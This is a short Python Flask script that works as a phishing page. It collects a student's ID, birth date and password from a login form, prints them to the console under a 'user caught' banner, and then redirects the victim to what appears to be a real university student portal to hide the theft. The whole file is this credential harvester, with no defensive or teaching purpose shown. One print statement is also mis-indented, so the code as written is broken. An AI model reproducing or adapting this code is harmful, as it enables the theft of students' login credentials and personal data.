from flask import Flask, render_template, request, redirect
import time

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    show_alert = False #until the user input his/her password hehe hacker

    if request.method == 'POST':
        studno = request.form.get('studno')
        month = request.form.get('SelectMonth')
        day = request.form.get('SelectDay')
        year = request.form.get('SelectYear')
        password = request.form.get('password')

                print(f"""
\033[1;31m╔════════════════════════════════════════════════╗
║ ██████╗ ██████╗ ██████╗ ██╗     ██╗███╗   ██╗ ║
║ ██╔══██╗╚════██╗██╔══██╗██║     ██║████╗  ██║ ║
║ ██████╔╝ █████╔╝██████╔╝██║     ██║██╔██╗ ██║ ║
║ ██╔══██╗ ╚═══██╗██╔══██╗██║     ██║██║╚██╗██║ ║
║ ██████╔╝██████╔╝██║  ██║███████╗██║██║ ╚████║ ║
║ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ║
╠════════════════════════════════════════════════╣
║              🚨  user caught  🚨              ║
╠════════════════════════════════════════════════╣
\033[1;32m║ 🆔 STUDENT ID   : {studno}
║ 🎂 BIRTH DATE   : {month}-{day}-{year}
║ 🔑 PASSWORD     : {password}
\033[1;31m╠════════════════════════════════════════════════╣
║        STATUS : ACCESS DENIED ❌               ║
║        RESULT : CONTROL ESTABLISHED ☠          ║
╚════════════════════════════════════════════════╝
\033[0m
""")

        if studno != "HelloWorld" and password != "HelloWorld":
            show_alert = True
            time.sleep(0.1)
            return redirect("https://sis2.pup.edu.ph/student/")
    
    return render_template('form.html')

if __name__ == '__main__':
    app.run(debug=True, use_reloader=False)

